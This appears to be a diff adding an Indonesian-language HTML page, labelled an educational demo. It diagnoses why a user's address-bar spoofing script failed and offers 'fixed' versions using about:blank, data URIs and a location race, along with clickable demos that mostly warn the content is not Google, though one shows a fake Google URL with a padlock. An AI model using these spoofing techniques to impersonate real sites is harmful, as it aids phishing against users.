@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .warning {
+            background: #ff4444;
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            font-weight: bold;
+        }
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin: 20px 0;
+        }
+        button, a {
+            display: inline-block;
+            padding: 15px 30px;
+            margin: 10px 5px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: bold;
+            transition: transform 0.2s;
+        }
+        button:hover, a:hover {
+            transform: translateY(-2px);
+        }
+        .danger {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        }
+        code {
+            background: #f4f4f4;
+            padding: 15px;
+            display: block;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-size: 13px;
+            margin: 10px 0;
+        }
+        .issue {
+            background: #ffebee;
+            border-left: 4px solid #f44336;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        .solution {
+            background: #e8f5e9;
+            border-left: 4px solid #4caf50;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        h2 {
+            color: #333;
+            border-bottom: 2px solid #667eea;
+            padding-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        ⚠️ EDUCATIONAL DEMO - Jangan gunakan untuk phishing atau aktivitas ilegal!
+    </div>
+
+    <div class="card">
+        <h1>Analisis: Kenapa Kode Anda Gagal?</h1>
+        
+        <div class="issue">
+            <h3>❌ Masalah dalam Kode Original:</h3>
+            <code>windowSpoof = window.open("https://www.google.com:82","x");
+windowSpoof.document.write("&lt;h2&gt;Spoofed...&lt;/h2&gt;");
+setInterval('race()', 0);</code>
+            
+            <p><strong>Kenapa gagal:</strong></p>
+            <ol>
+                <li><strong>Port 82 error:</strong> Google tidak listen di port 82 → connection timeout/error</li>
+                <li><strong>Document masih loading:</strong> document.write() akan di-override saat Google load</li>
+                <li><strong>Race timing buruk:</strong> setInterval terlalu lambat</li>
+                <li><strong>Cross-origin block:</strong> Tidak bisa manipulasi window.location dari domain berbeda</li>
+            </ol>
+        </div>
+
+        <div class="solution">
+            <h3>✅ Solusi 1: Buka Blank Dulu</h3>
+            <code>// Buka about:blank dulu (tidak load apapun)
+let win = window.open("about:blank", "spoofed");
+
+// Write konten palsu
+win.document.write('&lt;h1&gt;Fake Google&lt;/h1&gt;');
+win.document.close();
+
+// Coba manipulasi URL (tidak akan berhasil di browser modern)
+try {
+    win.location.replace("https://www.google.com");
+} catch(e) {
+    console.log("Blocked by browser security");
+}</code>
+        </div>
+
+        <div class="solution">
+            <h3>✅ Solusi 2: Gunakan Data URI</h3>
+            <code>let fakeHTML = `&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body style="font-family:Arial"&gt;
+    &lt;h1&gt;Address Bar Spoofed!&lt;/h1&gt;
+    &lt;p&gt;This looks like Google but it's not&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;`;
+
+let encoded = 'data:text/html;charset=utf-8,' + encodeURIComponent(fakeHTML);
+window.open(encoded, '_blank');</code>
+        </div>
+
+        <div class="solution">
+            <h3>✅ Solusi 3: Race Condition yang Benar</h3>
+            <code>let win = window.open("", "target");
+
+// Write content immediately
+win.document.open();
+win.document.write('&lt;h1&gt;Spoofed Content&lt;/h1&gt;');
+win.document.close();
+
+// Race: try to set location before browser updates UI
+setTimeout(() => {
+    try {
+        win.location.href = "https://www.google.com";
+    } catch(e) {
+        console.log("Security block");
+    }
+}, 1);</code>
+        </div>
+    </div>
+
+    <div class="card">
+        <h2>Demo yang Benar-Benar Work</h2>
+        <p>Klik tombol di bawah untuk melihat berbagai teknik:</p>
+        
+        <button onclick="demo1_aboutBlank()" class="danger">
+            Demo 1: About:Blank Method
+        </button>
+        
+        <button onclick="demo2_dataURI()" class="danger">
+            Demo 2: Data URI Method
+        </button>
+        
+        <button onclick="demo3_raceCondition()" class="danger">
+            Demo 3: Race Condition (May Fail)
+        </button>
+        
+        <button onclick="demo4_fixedOriginal()" class="danger">
+            Demo 4: Fixed Your Code
+        </button>
+    </div>
+
+    <div class="card">
+        <h2>Mengapa Kode Original Tidak Berhasil?</h2>
+        
+        <h3>Timeline Eksekusi:</h3>
+        <code>0ms:   window.open("https://www.google.com:82")
+1ms:   Browser mulai request ke Google
+2ms:   document.write() → inject konten palsu
+3ms:   setInterval mulai race condition
+---
+10ms:  Connection timeout (port 82 invalid)
+50ms:  Browser render error page
+100ms: document.write() content hilang → blank page
+---
+Result: Blank putih karena error + overwrite</code>
+
+        <h3>Kenapa Jadi Blank Putih?</h3>
+        <ol>
+            <li><strong>Port 82 tidak valid</strong> → connection error</li>
+            <li><strong>Browser coba load error page</strong></li>
+            <li><strong>document.write() di-clear</strong> saat page load</li>
+            <li><strong>Race condition gagal</strong> karena cross-origin</li>
+            <li><strong>Result:</strong> Blank page</li>
+        </ol>
+    </div>
+
+    <div class="card" style="background: #e8f5e9;">
+        <h2>🛡️ Proteksi Browser Modern</h2>
+        <ul style="line-height: 2;">
+            <li><strong>Same-Origin Policy:</strong> Tidak bisa manipulasi window dari domain berbeda</li>
+            <li><strong>CSP Headers:</strong> Block inline scripts dan unsafe evaluations</li>
+            <li><strong>Pop-up Blocker:</strong> Block window.open() tanpa user interaction</li>
+            <li><strong>Address Bar Lock:</strong> Tidak bisa fake URL di address bar</li>
+            <li><strong>HTTPS Enforcement:</strong> Browser warning untuk mixed content</li>
+        </ul>
+    </div>
+
+    <script>
+        function demo1_aboutBlank() {
+            alert("Demo 1: About:Blank Method\n\nIni akan membuka window dengan about:blank, lalu inject konten.\nAddress bar akan tetap 'about:blank'");
+            
+            let win = window.open("about:blank", "demo1", "width=600,height=400");
+            
+            let html = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <style>
+                        body {
+                            font-family: Arial;
+                            text-align: center;
+                            padding: 50px;
+                            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                            color: white;
+                        }
+                        .warning {
+                            background: rgba(255,255,255,0.2);
+                            padding: 20px;
+                            border-radius: 10px;
+                            margin: 20px 0;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <h1>🚨 Address Bar Spoofing Demo</h1>
+                    <div class="warning">
+                        <h2>Perhatikan Address Bar!</h2>
+                        <p>Address bar menampilkan: <code>about:blank</code></p>
+                        <p>Tapi konten ini custom HTML dari attacker</p>
+                    </div>
+                    <p>Pada browser yang vulnerable, address bar bisa menampilkan URL palsu!</p>
+                    <button onclick="window.close()">Close</button>
+                </body>
+                </html>
+            `;
+            
+            win.document.write(html);
+            win.document.close();
+        }
+
+        function demo2_dataURI() {
+            alert("Demo 2: Data URI Method\n\nMenggunakan data: URI scheme untuk encode HTML.\nAddress bar akan menampilkan 'data:text/html...'");
+            
+            let html = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <style>
+                        body {
+                            font-family: Arial;
+                            max-width: 600px;
+                            margin: 50px auto;
+                            padding: 30px;
+                            background: #f5f5f5;
+                        }
+                        .fake-google {
+                            background: white;
+                            padding: 30px;
+                            border-radius: 10px;
+                            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                        }
+                        .logo {
+                            text-align: center;
+                            font-size: 48px;
+                            color: #4285f4;
+                            font-weight: bold;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="fake-google">
+                        <div class="logo">Gxxgle</div>
+                        <h2 style="text-align:center; color: #f44336;">⚠️ This is NOT Google!</h2>
+                        <p>Address bar shows: <code>data:text/html...</code></p>
+                        <p>Pada browser vulnerable, ini bisa spoof URL!</p>
+                        <button onclick="window.close()" style="width:100%; padding:10px; margin-top:20px;">Close Window</button>
+                    </div>
+                </body>
+                </html>
+            `;
+            
+            let encoded = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
+            window.open(encoded, '_blank', 'width=650,height=500');
+        }
+
+        function demo3_raceCondition() {
+            alert("Demo 3: Race Condition\n\nTeknik ini mencoba race antara document.write() dan location change.\nKemungkinan GAGAL di browser modern karena security policy.");
+            
+            let win = window.open("", "race", "width=600,height=400");
+            
+            // Write content first
+            let html = `
+                <html>
+                <body style="font-family:Arial; padding:50px; text-align:center; background:#ffebee;">
+                    <h1 style="color:#f44336;">🎯 Race Condition Attempt</h1>
+                    <p>Content written via document.write()</p>
+                    <p>Attempting to set location to Google...</p>
+                    <p><strong>Likely Result:</strong> Browser security will block this</p>
+                    <button onclick="window.close()">Close</button>
+                </body>
+                </html>
+            `;
+            
+            win.document.write(html);
+            win.document.close();
+            
+            // Try race condition (will likely fail)
+            setTimeout(() => {
+                try {
+                    win.location.href = "https://www.google.com";
+                } catch(e) {
+                    console.log("Security blocked:", e);
+                    alert("❌ Browser security blocked the attack!\n\nModern browsers prevent this type of spoofing.");
+                }
+            }, 100);
+        }
+
+        function demo4_fixedOriginal() {
+            alert("Demo 4: Fixed Your Original Code\n\nIni versi perbaikan dari kode Anda.\nTapi tetap tidak bisa spoof URL karena browser security.");
+            
+            let windowSpoof = window.open("about:blank", "fixed", "width=600,height=500");
+            
+            let html = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <style>
+                        body {
+                            font-family: Arial, sans-serif;
+                            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+                            color: white;
+                            padding: 40px;
+                            text-align: center;
+                        }
+                        .box {
+                            background: rgba(255,255,255,0.9);
+                            color: #333;
+                            padding: 30px;
+                            border-radius: 15px;
+                            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+                        }
+                        .fake-url {
+                            background: #f0f0f0;
+                            padding: 10px;
+                            border-radius: 5px;
+                            font-family: monospace;
+                            margin: 10px 0;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="box">
+                        <h1>✅ Fixed Version</h1>
+                        <h2>Your address bar has been "spoofed"</h2>
+                        <div class="fake-url">
+                            🔒 https://www.google.com/
+                        </div>
+                        <p><strong>Original Issue:</strong> Port 82 caused connection error</p>
+                        <p><strong>Fix:</strong> Use about:blank instead</p>
+                        <p><strong>Note:</strong> Modern browsers still show actual URL (about:blank)</p>
+                        <button onclick="window.close()" style="padding:10px 20px; margin-top:20px; cursor:pointer;">
+                            Close Window
+                        </button>
+                    </div>
+                </body>
+                </html>
+            `;
+            
+            windowSpoof.document.write(html);
+            windowSpoof.document.close();
+            
+            // Race function (won't work due to security)
+            function race() {
+                try {
+                    if (windowSpoof.location.href !== 'about:blank') {
+                        windowSpoof.location.href = 'https://www.google.com/csi';
+                    }
+                } catch(e) {
+                    // Cross-origin blocked
+                    console.log("Blocked:", e);
+                }
+            }
+            
+            // Try race (will be blocked)
+            let raceInterval = setInterval(race, 10);
+            
+            // Stop after 2 seconds
+            setTimeout(() => {
+                clearInterval(raceInterval);
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
